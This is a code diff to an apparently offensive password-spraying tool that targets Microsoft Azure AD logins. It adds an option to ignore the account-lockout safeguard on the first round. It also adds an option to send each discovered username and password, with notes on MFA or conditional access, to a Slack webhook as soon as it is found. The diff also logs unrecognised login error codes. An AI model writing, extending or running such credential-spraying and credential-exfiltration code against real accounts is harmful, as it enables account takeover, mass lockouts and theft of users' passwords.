@@ -153,11 +153,18 @@ parser.add_argument(
     help=("A comma-separated list of URL(s) to spray against (default: %(default)s)."
         " Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from."),
 )
-parser.add_argument(
+group_force = parser.add_mutually_exclusive_group(required=False)
+group_force.add_argument(
     "-f",
     "--force",
     action="store_true",
     help="Forces the spray to continue and not stop when multiple account lockouts are detected.",
+)
+group_force.add_argument(
+    "--force-first",
+    action="store_true",
+    dest="force_first",
+    help="Like --force but only for first iteration. Use it with '-a 2' for otimization.",
 )
 parser.add_argument(
     "--shuffle",
@@ -187,6 +194,12 @@ parser.add_argument(
     help="Slack webhook for sending notifications about needed actions (default: same as --notify).",
     default=None,
     required=False,
+)
+parser.add_argument(
+    "--notify-each",
+    action="store_true",
+    dest="notify_each",
+    help="If set in conjunction with --notify WEBHOOK, it will notify each valid creds besides final summary."
 )
 parser.add_argument(
     "-s",
@@ -355,6 +368,10 @@ for pindex, password in enumerate(passwords):
             results += f"{username} : {password}\n"
             results_list.append(f"{username}:{password}")
             usernames.remove(username)
+            if args.notify and args.notify_each:
+                    msg = "Found valid credentials! (-.^)\n\n"
+                    msg += f"{username}:{password}"
+                    notify(args.notify, msg)
         else:
             resp = r.json()
             error = resp["error_description"]
@@ -386,6 +403,10 @@ for pindex, password in enumerate(passwords):
                 results += f"{username} : {password}\n"
                 results_list.append(f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use")
                 usernames.remove(username)
+                if args.notify and args.notify_each:
+                    msg = "Found valid credentials! (-.^)\n\n"
+                    msg += f"{username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use."
+                    notify(args.notify, msg)
 
             elif "AADSTS50158" in error:
                 # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
@@ -395,6 +416,10 @@ for pindex, password in enumerate(passwords):
                 results += f"{username} : {password}\n"
                 results_list.append(f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
                 usernames.remove(username)
+                if args.notify and args.notify_each:
+                    msg = "Found valid credentials! (-.^)\n\n"
+                    msg += f"{username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                    notify(args.notify, msg)
 
             elif "AADSTS50053" in error:
                 # Locked out account or Smart Lockout in place
@@ -421,6 +446,10 @@ for pindex, password in enumerate(passwords):
                 results += f"{username} : {password}\n"
                 results_list.append(f"{username}:{password} - NOTE: The user's password is expired.")
                 usernames.remove(username)
+                if args.notify and args.notify_each:
+                    msg = "Found valid credentials! (-.^)\n\n"
+                    msg += f"{username}:{password} - NOTE: The user's password is expired."
+                    notify(args.notify, msg)
 
             elif "AADSTS700016" in error:
                 # Application not found in directory (probably because random-generated uuid above)
@@ -430,6 +459,10 @@ for pindex, password in enumerate(passwords):
                 results += f"{username} : {password}\n"
                 results_list.append(f"{username}:{password}")
                 usernames.remove(username)
+                if args.notify and args.notify_each:
+                    msg = "Found valid credentials! (-.^)\n\n"
+                    msg += f"{username}:{password}"
+                    notify(args.notify, msg)
             elif "AADSTS50056" in error:
                 # Invalid or null password: password doesn't exist in the directory for this user.
                 # The user should be asked to enter their password again.
@@ -446,14 +479,23 @@ for pindex, password in enumerate(passwords):
                 results += f"{username} : {password}\n"
                 results_list.append(f"{username}:{password} - NOTE: Access blocked by Conditional Access policies.")
                 usernames.remove(username)
+                if args.notify and args.notify_each:
+                    msg = "Found valid credentials! (-.^)\n\n"
+                    msg += f"{username}:{password} - NOTE: Access blocked by Conditional Access policies."
+                    notify(args.notify, msg)
             else:
                 # Unknown errors
                 print(f"Got an error we haven't seen yet for user {username}")
                 print(error)
+                # Log unknown errors for late analysis
+                with open("unknown_codes.log", "a") as f:
+                    f.write(f"Got an error we haven't seen yet for user {username}")
+                    f.write(f"{error}\n")
 
         # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
         if (
             not args.force
+            and not (args.force_first and pindex == 0)
             and lockout_counter > 0
             and lockout_counter >= lockout_max
             and lockout_question == False
